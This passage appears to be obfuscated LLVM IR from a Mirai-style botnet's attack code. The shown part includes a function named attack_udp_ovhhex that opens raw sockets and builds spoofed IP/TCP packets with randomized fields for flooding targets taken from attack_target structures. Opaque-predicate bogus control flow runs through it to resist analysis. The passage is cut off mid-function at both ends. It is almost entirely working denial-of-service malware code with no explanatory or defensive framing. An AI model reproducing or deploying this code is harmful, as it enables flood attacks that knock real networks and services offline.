  %392 = call zeroext i16 @htons(i16 zeroext %391) #7
  store i16 %392, i16* %13, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %393 = load i32, i32* %9, align 4
  %394 = load i8, i8* %5, align 1
  %395 = zext i8 %394 to i32
  %396 = icmp slt i32 %393, %395
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %145
  %397 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %398 = load i32*, i32** %11, align 8
  %399 = load i32, i32* %9, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds i32, i32* %398, i64 %400
  store i32 %397, i32* %401, align 4
  %402 = icmp eq i32 %397, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %169
  %403 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %403, align 4
  %404 = load i16, i16* %13, align 2
  %405 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %404, i16* %405, align 2
  %406 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %407 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %406, i32 0, i32 0
  store i32 0, i32* %407, align 4
  %408 = load i32*, i32** %11, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds i32, i32* %408, i64 %410
  %412 = load i32, i32* %411, align 4
  %413 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %414 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %414, %struct.sockaddr** %413, align 8
  %415 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %416 = load %struct.sockaddr*, %struct.sockaddr** %415, align 8
  %417 = call i32 @bind(i32 %412, %struct.sockaddr* %416, i32 16) #6
  %418 = icmp eq i32 %417, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %212
  %419 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %420 = load i32, i32* %9, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i32 0, i32 1
  %424 = load i32, i32* %423, align 4
  %425 = call i32 @ntohl(i32 %424) #7
  %426 = call i32 @rand_next()
  %427 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 2
  %432 = load i8, i8* %431, align 4
  %433 = zext i8 %432 to i32
  %_ = sub i32 0, %426
  %gen = add i32 %_, %433
  %_19 = shl i32 %426, %433
  %_20 = sub i32 0, %426
  %gen21 = add i32 %_20, %433
  %_22 = sub i32 %426, %433
  %gen23 = mul i32 %_22, %433
  %_24 = shl i32 %426, %433
  %_25 = sub i32 0, %426
  %gen26 = add i32 %_25, %433
  %_27 = shl i32 %426, %433
  %434 = lshr i32 %426, %433
  %_28 = shl i32 %425, %434
  %_29 = sub i32 %425, %434
  %gen30 = mul i32 %_29, %434
  %_31 = sub i32 %425, %434
  %gen32 = mul i32 %_31, %434
  %_33 = shl i32 %425, %434
  %435 = add i32 %425, %434
  %436 = call i32 @htonl(i32 %435) #7
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %441, i32 0, i32 2
  %443 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %442, i32 0, i32 0
  store i32 %436, i32* %443, align 4
  br label %originalBB18

originalBB37alteredBB:                            ; preds = %originalBB37, %254
  %444 = load i32*, i32** %11, align 8
  %445 = load i32, i32* %9, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds i32, i32* %444, i64 %446
  %448 = load i32, i32* %447, align 4
  %449 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %450 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %451 = load i32, i32* %9, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %450, i64 %452
  %454 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %453, i32 0, i32 0
  %455 = bitcast %struct.sockaddr_in* %454 to %struct.sockaddr*
  store %struct.sockaddr* %455, %struct.sockaddr** %449, align 8
  %456 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %457 = load %struct.sockaddr*, %struct.sockaddr** %456, align 8
  %458 = call i32 @connect(i32 %448, %struct.sockaddr* %457, i32 16)
  %459 = icmp eq i32 %458, -1
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %289
  %460 = load i32, i32* %9, align 4
  %_42 = shl i32 %460, 1
  %461 = add nsw i32 %460, 1
  store i32 %461, i32* %9, align 4
  br label %originalBB41

originalBB46alteredBB:                            ; preds = %originalBB46, %310
  %462 = load i32, i32* %9, align 4
  %463 = load i8, i8* %5, align 1
  %464 = zext i8 %463 to i32
  %465 = icmp slt i32 %462, %464
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %339
  %466 = load i8*, i8** %23, align 8
  %467 = load i16, i16* %14, align 2
  %468 = zext i16 %467 to i32
  call void @rand_str(i8* %466, i32 %468)
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %369
  %469 = load i32, i32* %9, align 4
  %470 = add nsw i32 %469, 1
  store i32 %470, i32* %9, align 4
  br label %originalBB54
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_ovhhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca [256 x i8*], align 16
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %11, align 8
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %12, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %13, align 2
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %15, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %16, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %17, align 2
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 17, i32 65535)
  store i32 %66, i32* %18, align 4
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 18, i32 0)
  store i32 %69, i32* %19, align 4
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 11, i32 0)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %20, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 12, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %21, align 1
  %78 = load i8, i8* %7, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 13, i32 0)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %22, align 1
  %82 = load i8, i8* %7, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 14, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %23, align 1
  %86 = load i8, i8* %7, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 15, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %24, align 1
  %90 = load i8, i8* %7, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 16, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %25, align 1
  %94 = load i8, i8* %7, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %96 = load i32, i32* @LOCAL_ADDR, align 4
  %97 = call i32 @attack_get_opt_ip(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 25, i32 %96)
  store i32 %97, i32* %26, align 4
  %98 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %98, i32* %10, align 4
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %4
  br label %605

; <label>:101:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %102 = load i32, i32* %10, align 4
  %103 = bitcast i32* %9 to i8*
  %104 = call i32 @setsockopt(i32 %102, i32 0, i32 3, i8* %103, i32 4) #6
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %101
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  br label %605

; <label>:109:                                    ; preds = %101
  store i32 0, i32* %9, align 4
  br label %110

; <label>:110:                                    ; preds = %originalBBpart214, %109
  %111 = load i32, i32* @x.27
  %112 = load i32, i32* @y.28
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %110
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  %123 = load i32, i32* @x.27
  %124 = load i32, i32* @y.28
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %122, label %131, label %344

; <label>:131:                                    ; preds = %originalBBpart2
  %132 = bitcast [256 x i8*]* %30 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %132, i8* bitcast ([256 x i8*]* @attack_udp_ovhhex.leon_hex to i8*), i64 2048, i32 16, i1 false)
  %133 = call i32 @rand() #6
  %134 = srem i32 %133, 256
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [256 x i8*], [256 x i8*]* %30, i64 0, i64 %135
  %137 = load i8*, i8** %136, align 8
  store i8* %137, i8** %31, align 8
  %138 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %139 = load i8**, i8*** %11, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  store i8* %138, i8** %142, align 8
  %143 = load i8**, i8*** %11, align 8
  %144 = load i32, i32* %9, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to %struct.iphdr*
  store %struct.iphdr* %148, %struct.iphdr** %27, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i64 1
  %151 = bitcast %struct.iphdr* %150 to %struct.tcphdr*
  store %struct.tcphdr* %151, %struct.tcphdr** %28, align 8
  %152 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %153 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %152, i64 1
  %154 = bitcast %struct.tcphdr* %153 to i8*
  store i8* %154, i8** %29, align 8
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = bitcast %struct.iphdr* %155 to i8*
  %157 = load i8, i8* %156, align 4
  %158 = and i8 %157, 15
  %159 = or i8 %158, 64
  store i8 %159, i8* %156, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = load i8, i8* %161, align 4
  %163 = and i8 %162, -16
  %164 = or i8 %163, 5
  store i8 %164, i8* %161, align 4
  %165 = load i8, i8* %12, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 1
  store i8 %165, i8* %167, align 1
  %168 = call zeroext i16 @htons(i16 zeroext 60) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i16, i16* %13, align 2
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i8, i8* %14, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 5
  store i8 %175, i8* %177, align 4
  %178 = load i8, i8* %15, align 1
  %179 = icmp ne i8 %178, 0
  br i1 %179, label %180, label %200

; <label>:180:                                    ; preds = %131
  %181 = load i32, i32* @x.27
  %182 = load i32, i32* @y.28
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %180
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  %192 = load i32, i32* @x.27
  %193 = load i32, i32* @y.28
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %200

; <label>:200:                                    ; preds = %originalBBpart24, %131
  %201 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 6, i8* %202, align 1
  %203 = load i32, i32* %26, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %207 = load i32, i32* %9, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 1
  %211 = load i32, i32* %210, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 9
  store i32 %211, i32* %213, align 4
  %214 = load i16, i16* %16, align 2
  %215 = call zeroext i16 @htons(i16 zeroext %214) #7
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 0
  store i16 %215, i16* %217, align 4
  %218 = load i16, i16* %17, align 2
  %219 = call zeroext i16 @htons(i16 zeroext %218) #7
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 1
  store i16 %219, i16* %221, align 2
  %222 = load i32, i32* %18, align 4
  %223 = trunc i32 %222 to i16
  %224 = call zeroext i16 @htons(i16 zeroext %223) #7
  %225 = zext i16 %224 to i32
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 2
  store i32 %225, i32* %227, align 4
  %228 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -241
  %232 = or i16 %231, 160
  store i16 %232, i16* %229, align 4
  %233 = load i8, i8* %20, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 13
  %240 = and i16 %237, -8193
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %21, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 12
  %249 = and i16 %246, -4097
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8, i8* %22, align 1
  %252 = sext i8 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 4
  %255 = load i16, i16* %254, align 4
  %256 = and i16 %252, 1
  %257 = shl i16 %256, 11
  %258 = and i16 %255, -2049
  %259 = or i16 %258, %257
  store i16 %259, i16* %254, align 4
  %260 = load i8, i8* %23, align 1
  %261 = sext i8 %260 to i16
  %262 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %263 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %262, i32 0, i32 4
  %264 = load i16, i16* %263, align 4
  %265 = and i16 %261, 1
  %266 = shl i16 %265, 10
  %267 = and i16 %264, -1025
  %268 = or i16 %267, %266
  store i16 %268, i16* %263, align 4
  %269 = load i8, i8* %24, align 1
  %270 = sext i8 %269 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 4
  %273 = load i16, i16* %272, align 4
  %274 = and i16 %270, 1
  %275 = shl i16 %274, 9
  %276 = and i16 %273, -513
  %277 = or i16 %276, %275
  store i16 %277, i16* %272, align 4
  %278 = load i8, i8* %25, align 1
  %279 = sext i8 %278 to i16
  %280 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = and i16 %279, 1
  %284 = shl i16 %283, 8
  %285 = and i16 %282, -257
  %286 = or i16 %285, %284
  store i16 %286, i16* %281, align 4
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 2, i8* %287, align 1
  %289 = load i8*, i8** %29, align 8
  %290 = getelementptr inbounds i8, i8* %289, i32 1
  store i8* %290, i8** %29, align 8
  store i8 4, i8* %289, align 1
  %291 = call i32 @rand_next()
  %292 = and i32 %291, 15
  %293 = add i32 1400, %292
  %294 = trunc i32 %293 to i16
  %295 = call zeroext i16 @htons(i16 zeroext %294) #7
  %296 = load i8*, i8** %29, align 8
  %297 = bitcast i8* %296 to i16*
  store i16 %295, i16* %297, align 2
  %298 = load i8*, i8** %29, align 8
  %299 = getelementptr inbounds i8, i8* %298, i64 2
  store i8* %299, i8** %29, align 8
  %300 = load i8*, i8** %29, align 8
  %301 = getelementptr inbounds i8, i8* %300, i32 1
  store i8* %301, i8** %29, align 8
  store i8 4, i8* %300, align 1
  %302 = load i8*, i8** %29, align 8
  %303 = getelementptr inbounds i8, i8* %302, i32 1
  store i8* %303, i8** %29, align 8
  store i8 2, i8* %302, align 1
  %304 = load i8*, i8** %29, align 8
  %305 = getelementptr inbounds i8, i8* %304, i32 1
  store i8* %305, i8** %29, align 8
  store i8 8, i8* %304, align 1
  %306 = load i8*, i8** %29, align 8
  %307 = getelementptr inbounds i8, i8* %306, i32 1
  store i8* %307, i8** %29, align 8
  store i8 10, i8* %306, align 1
  %308 = call i32 @rand_next()
  %309 = load i8*, i8** %29, align 8
  %310 = bitcast i8* %309 to i32*
  store i32 %308, i32* %310, align 4
  %311 = load i8*, i8** %29, align 8
  %312 = getelementptr inbounds i8, i8* %311, i64 4
  store i8* %312, i8** %29, align 8
  %313 = load i8*, i8** %29, align 8
  %314 = bitcast i8* %313 to i32*
  store i32 0, i32* %314, align 4
  %315 = load i8*, i8** %29, align 8
  %316 = getelementptr inbounds i8, i8* %315, i64 4
  store i8* %316, i8** %29, align 8
  %317 = load i8*, i8** %29, align 8
  %318 = getelementptr inbounds i8, i8* %317, i32 1
  store i8* %318, i8** %29, align 8
  store i8 1, i8* %317, align 1
  %319 = load i8*, i8** %29, align 8
  %320 = getelementptr inbounds i8, i8* %319, i32 1
  store i8* %320, i8** %29, align 8
  store i8 3, i8* %319, align 1
  %321 = load i8*, i8** %29, align 8
  %322 = getelementptr inbounds i8, i8* %321, i32 1
  store i8* %322, i8** %29, align 8
  store i8 3, i8* %321, align 1
  %323 = load i8*, i8** %29, align 8
  %324 = getelementptr inbounds i8, i8* %323, i32 1
  store i8* %324, i8** %29, align 8
  store i8 6, i8* %323, align 1
  br label %325

; <label>:325:                                    ; preds = %200
  %326 = load i32, i32* @x.27
  %327 = load i32, i32* @y.28
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %325
  %334 = load i32, i32* %9, align 4
  %335 = add nsw i32 %334, 1
  store i32 %335, i32* %9, align 4
  %336 = load i32, i32* @x.27
  %337 = load i32, i32* @y.28
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br label %110

; <label>:344:                                    ; preds = %originalBBpart2
  br label %345

; <label>:345:                                    ; preds = %604, %344
  %346 = load i32, i32* @x.27
  %347 = load i32, i32* @y.28
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %345
  store i32 0, i32* %9, align 4
  %354 = load i32, i32* @x.27
  %355 = load i32, i32* @y.28
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %362

; <label>:362:                                    ; preds = %601, %originalBBpart218
  %363 = load i32, i32* %9, align 4
  %364 = load i8, i8* %5, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp slt i32 %363, %365
  br i1 %366, label %367, label %604

; <label>:367:                                    ; preds = %362
  %368 = load i32, i32* @x.27
  %369 = load i32, i32* @y.28
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %367
  %376 = load i8**, i8*** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds i8*, i8** %376, i64 %378
  %380 = load i8*, i8** %379, align 8
  store i8* %380, i8** %32, align 8
  %381 = load i8*, i8** %32, align 8
  %382 = bitcast i8* %381 to %struct.iphdr*
  store %struct.iphdr* %382, %struct.iphdr** %33, align 8
  %383 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i64 1
  %385 = bitcast %struct.iphdr* %384 to %struct.tcphdr*
  store %struct.tcphdr* %385, %struct.tcphdr** %34, align 8
  %386 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %387 = load i32, i32* %9, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i64 %388
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i32 0, i32 2
  %391 = load i8, i8* %390, align 4
  %392 = zext i8 %391 to i32
  %393 = icmp slt i32 %392, 32
  %394 = load i32, i32* @x.27
  %395 = load i32, i32* @y.28
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %393, label %402, label %439

; <label>:402:                                    ; preds = %originalBBpart222
